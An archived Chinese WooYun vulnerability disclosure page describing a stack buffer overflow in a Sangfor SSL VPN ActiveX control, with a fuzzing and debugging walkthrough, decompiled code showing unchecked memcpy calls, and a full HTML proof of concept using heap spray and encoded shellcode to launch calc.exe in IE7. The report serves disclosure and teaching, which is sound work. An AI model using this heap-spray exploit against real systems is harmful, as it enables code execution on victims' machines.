@@ -1,0 +1,397 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		深信服Activex控件BOF漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		深信服Activex控件BOF漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/摸了你">摸了你</a> 
+</li><li>提交时间：		2013-11-28 22:37</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-28：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-29：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-02：	细节向第三方安全合作伙伴开放<br/>
+									2013-12-09：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-19：	细节向普通白帽子公开<br/>
+									2014-01-08：	细节向实习白帽子公开<br/>
+									2014-02-26：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">BOF一枚，提交这个是想告诉，白帽子同学，如果知其所有然，就不会有相同的漏洞被其它人发现了(ActiveX 漏洞挖掘&amp;分析教程）！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">说明：<br />
+<br />
+起因是这样的，在分析 <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-038584">WooYun: 深信服Activex控件bufferoverflow漏洞</a> 这个漏洞的时候，发现其实还有处可导致BOF，只不过参数不一样，漏洞产生的位置也相近，<br />
+<br />
+下面来过程。<br />
+<br />
+1、Fuzz<br />
+<br />
+前面洞主用的Fuzz工具是Dranzer，我用的是COMRadier。<br />
+<br />
+没能找到其它地方下载该ActiveX，只能按 想要减肥的胖子 提供的链接下载程序并安装。<br />
+<br />
+<br />
+<br />
+使用ComRadier的方法，很简单！搜一下便知。<br />
+<br />
+<br />
+<br />
+Fuzz后，此处我们只关心Fuzz后Result列为Cause Exception的相关行，选中该行后，下面列表里会显示产生异常的Address,异常原因，这里我们只看，异常地址为41414141的，因为41414141意味着eip被覆盖成41414141。<br />
+<br />
+</p><p class="detail"><a href="../images/28195117e0dcbb6c99a238a9351df87872c4424a.png" target="_blank"><img src="../images/28195117e0dcbb6c99a238a9351df87872c4424a.png" alt="Fuzzresult.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2、分析异常原因<br />
+<br />
+右击选中的行弹出菜单，选中Lauch in Olly，此外我设置的Immunity Debug（此外同样适用于OD）,它会加载Fuzz的测试文件。<br />
+<br />
+Alt+E打开Immunity Debug模块,找到OLEAUT32.dll<br />
+<br />
+</p><p class="detail"><a href="../images/28201149d3707dd1b6b523bc0897807bf5fe315c.jpg" target="_blank"><img src="../images/28201149d3707dd1b6b523bc0897807bf5fe315c.jpg" alt="m.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+双击该模块，进去后按Ctrl+n键，找到DispCallFunc函数，按F2下断<br />
+<br />
+</p><p class="detail"><a href="../images/2820132897c3d107370e778101e4bb8352fb4d3e.jpg" target="_blank"><img src="../images/2820132897c3d107370e778101e4bb8352fb4d3e.jpg" alt="f2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+F9直接跑，程序断在DispCallFunc,此时，托动鼠标向下找，找到Call Ecx 指令，按F4，执行到此处<br />
+<br />
+</p><p class="detail"><a href="../images/28201657b6febde90d412d6550aade8160d6bab0.png" target="_blank"><img src="../images/28201657b6febde90d412d6550aade8160d6bab0.png" alt="F4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+然后 F7 单步步入<br />
+<br />
+</p><p class="detail"><a href="../images/2820183847160e36890d1f332a2544134f4e1266.jpg" target="_blank"><img src="../images/2820183847160e36890d1f332a2544134f4e1266.jpg" alt="F7.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+然后 按F8 一直走，走到每一个 Call的时候要注意记下，找到异常Call,要重复执行以上步骤。<br />
+<br />
+直到我们找到产生异常的Call<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/28202303cfdce33fd18b8054c4d04e1ca561f13f.jpg" target="_blank"><img src="../images/28202303cfdce33fd18b8054c4d04e1ca561f13f.jpg" alt="Func Stack.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+此处我们便可以分析，汇编了，汇编可以发现<br />
+<br />
+REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI] 这条指令把执行了拷贝数据到堆栈的操作。<br />
+<br />
+3、IDA<br />
+<br />
+汇编太难懂，能不能更直观点呢，IDA上场了。<br />
+<br />
+我们找到这个异常发生的函数的地址此处是020099A0,看下该模块在Immunity 里的地址是02001000，那么可得offset为89A0，那么我们用IDA打开ActiveX对应的dll,用IDA的起始地址10001000+89A0,得到函数的偏移，按住g，到达100099A0处<br />
+<br />
+</p><p class="detail"><a href="../images/28203328bd7462c542f76ffcb2dc842cc60d42e6.jpg" target="_blank"><img src="../images/28203328bd7462c542f76ffcb2dc842cc60d42e6.jpg" alt="ida.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+按下F5<br />
+<br />
+得到如下从汇编到C的代码<br />
+<br />
+</p><pre><code>int __cdecl sub_100099A0(const char *ArgList, int a2, struct in_addr in, __int16 a4, const char *a5, int a6, int a7)<br />
+{<br />
+  unsigned int v7; // edx@3<br />
+  unsigned int v8; // kr10_4@3<br />
+  const char *v9; // edi@3<br />
+  signed int v10; // ecx@3<br />
+  bool v11; // zf@5<br />
+  signed int v12; // eax@6<br />
+  unsigned int v13; // ecx@6<br />
+  int v14; // eax@6<br />
+  int result; // eax@8<br />
+  int v16; // [sp+Ch] [bp-808h]@3<br />
+  int v17; // [sp+10h] [bp-804h]@3<br />
+  unsigned int optval; // [sp+14h] [bp-800h]@3<br />
+  int v19; // [sp+18h] [bp-7FCh]@6<br />
+  int v20; // [sp+1Ch] [bp-7F8h]@3<br />
+  int v21; // [sp+20h] [bp-7F4h]@3<br />
+  struct in_addr v22; // [sp+24h] [bp-7F0h]@3<br />
+  __int16 v23; // [sp+28h] [bp-7ECh]@3<br />
+  int v24; // [sp+2Ch] [bp-7E8h]@3<br />
+  int v25; // [sp+30h] [bp-7E4h]@6<br />
+  const char v26; // [sp+34h] [bp-7E0h]@6<br />
+  __int16 v27; // [sp+411h] [bp-403h]@3<br />
+  char v28; // [sp+413h] [bp-401h]@3<br />
+  _BYTE v29[1024]; // [sp+414h] [bp-400h]@6<br />
+<br />
+  inet_ntoa(in);<br />
+  sub_10017CE0(<br />
+    &quot;[CSCM CDC] 客户端登录 userName = %s，auth_method = %d，svpnIp = %s，svpnPort = %d，secret = %s，grpId = %d，granularity = %d。&quot;,<br />
+    (char)ArgList);<br />
+  if ( !ArgList || !a5 )<br />
+    goto LABEL_12;<br />
+  memset((char *)&amp;optval + 1, 0, 0x3FCu);<br />
+  v27 = 0;<br />
+  v28 = 0;<br />
+  v24 = a7;<br />
+  v7 = strlen(ArgList);<br />
+  v8 = strlen(a5) + 1;<br />
+  v9 = a5;<br />
+  v17 = 1024;<br />
+  v16 = v7 + v8 - 1 + 38;<br />
+  optval = v7 + v8 - 1 + 38;<br />
+  v21 = a6;<br />
+  v20 = a2;<br />
+  v23 = a4;<br />
+  v22 = in;<br />
+  v10 = -1;<br />
+  do<br />
+  {<br />
+    if ( !v10 )<br />
+      break;<br />
+    v11 = *v9++ == 0;<br />
+    --v10;<br />
+  }<br />
+  while ( !v11 );<br />
+  v19 = 0;<br />
+  v12 = ~v10;<br />
+  v29[0] = 0;<br />
+  v25 = ~v10;<br />
+  memcpy((void *)&amp;v26, a5, ~v10);<br />
+  v13 = strlen(ArgList) + 1;<br />
+  *(unsigned int *)((char *)&amp;optval + v12 + 32) = v13;<br />
+  memcpy((char *)&amp;v19 + v12 + 32, ArgList, v13);<br />
+  memset(&amp;v29[1], 0, 0x3FCu);<br />
+  *(_WORD *)&amp;v29[1021] = 0;<br />
+  v29[1023] = 0;<br />
+  v14 = sub_10009730((unsigned int)&amp;optval, (int)&amp;v16, (int)v29, (int)&amp;v17);<br />
+  if ( v14 != 2 &amp;&amp; v14 != 3 )<br />
+    result = v14 != 1;<br />
+  else<br />
+LABEL_12:<br />
+    result = 0;<br />
+  return result;<br />
+}</code></pre><p class='detail'><br />
+<br />
+分析代码可知，原因是由于之前的漏洞是因为此处<br />
+<br />
+memcpy((char *)&amp;v19 + v12 + 32, ArgList, v13);<br />
+<br />
+导致，此处v19为局部变量，v12为第5个参数的长度，v13为函数第一个参数的长度，<br />
+<br />
+这里将此参数的第一个参数的值拷贝到局部变量，而没有限制，校验长度，导致BOF。<br />
+<br />
+<br />
+<br />
+那么我们细看，该函数还有一个参数是字符串，还有一个memcpy的调用<br />
+<br />
+memcpy((void *)&amp;v26, a5, ~v10);<br />
+<br />
+这里是将函数的第5个参数拷贝到v26的地址，长度为a5的长度，同样会导致BOF。<br />
+<br />
+往下拉我们的ComRaider，它也Fuzz出来了。<br />
+<br />
+</p><pre><code>&lt;?XML version=&#039;1.0&#039; standalone=&#039;yes&#039; ?&gt;<br />
+&lt;package&gt;&lt;job id=&#039;DoneInVBS&#039; debug=&#039;false&#039; error=&#039;true&#039;&gt;<br />
+&lt;object classid=&#039;clsid:250587D2-6704-4479-8718-3C7E163B4213&#039; id=&#039;target&#039; /&gt;<br />
+&lt;script language=&#039;vbscript&#039;&gt;<br />
+<br />
+&#039;File Generated by COMRaider v0.0.134 - http://labs.idefense.com<br />
+<br />
+&#039;Wscript.echo typename(target)<br />
+<br />
+&#039;for debugging/custom prolog<br />
+targetFile = &quot;C:\Program Files\Sinfor\SSL\ClientComponent\CSClientManagerPrj.dll&quot;<br />
+prototype  = &quot;Sub ClientLoginToCDC ( ByVal userName As String ,  ByVal auth_method As Long ,  ByVal svpnIp As String ,  ByVal svpnPort As Integer ,  ByVal secret As String ,  ByVal grpId As Long ,  ByVal granularity As Long )&quot;<br />
+memberName = &quot;ClientLoginToCDC&quot;<br />
+progid     = &quot;CSCLIENTMANAGERPRJLib.CSClientManager&quot;<br />
+argCount   = 7<br />
+<br />
+arg1=&quot;defaultV&quot;<br />
+arg2=1<br />
+arg3=&quot;defaultV&quot;<br />
+arg4=1<br />
+arg5=String(6164, &quot;A&quot;)<br />
+arg6=1<br />
+arg7=1<br />
+<br />
+target.ClientLoginToCDC arg1 ,arg2 ,arg3 ,arg4 ,arg5 ,arg6 ,arg7 <br />
+<br />
+&lt;/script&gt;&lt;/job&gt;&lt;/package&gt;</code></pre><p class='detail'><br />
+<br />
+之前的BOF，通过Heay Spray可成功弹出计算器。此处同理，我们只需要把之前漏洞作者的POC中<br />
+<br />
+target.ClientLoginToCDC(buffer,1,&quot;defaultv&quot;,1,&quot;defaultv&quot;,1,1);<br />
+<br />
+target.ClientLoginToCDC(&quot;defaultv&quot;,1,&quot;defaultv&quot;,1,buffer,1,1);<br />
+<br />
+就行。<br />
+<br />
+4、本想在zone发分析的，想想，这里有个隐藏的之前没有提，怕厂商像tx那样只修改一个参数，导致白帽子多次提交同一处的不同参数导致的漏洞，这里我就提交下。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;object classid=&#039;clsid:250587D2-6704-4479-8718-3C7E163B4213&#039; id=&quot;target&quot;&gt;&lt;/object&gt; <br />
+&lt;script&gt;<br />
+shellcode = unescape(<br />
+&#039;%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395&#039;+<br />
+&#039;%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1&#039;+<br />
+&#039;%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e&#039;+<br />
+&#039;%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5&#039;+<br />
+&#039;%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f&#039;+<br />
+&#039;%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5&#039;+<br />
+&#039;%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525&#039;+<br />
+&#039;%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e&#039;);<br />
+nops=unescape(&#039;%u9090%u9090&#039;);<br />
+headersize =20;<br />
+slackspace= headersize + shellcode.length;<br />
+while(nops.length &lt; slackspace) nops+= nops;<br />
+fillblock= nops.substring(0, slackspace);<br />
+block= nops.substring(0, nops.length- slackspace);<br />
+while( block.length+ slackspace&lt;0x50000) block= block+ block+ fillblock;<br />
+memory=new Array();<br />
+for( counter=0; counter&lt;200; counter++) <br />
+memory[counter]= block + shellcode;<br />
+buffer=&#039;&#039;;<br />
+for( counter=0; counter&lt;=1100; counter++) <br />
+buffer+=unescape(&quot;%0D%0D%0D%0D&quot;);<br />
+target.ClientLoginToCDC(&quot;defaultv&quot;,1,&quot;defaultv&quot;,1,buffer,1,1);<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+IE7下测试，成功弹出Calc.exe<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">慎用memcpy </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/摸了你" title="摸了你">摸了你</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-044352" title="深信服Activex控件BOF漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2013-11-29 14:31</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">现有补丁包中的已修复漏洞，依然谢谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="44352";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
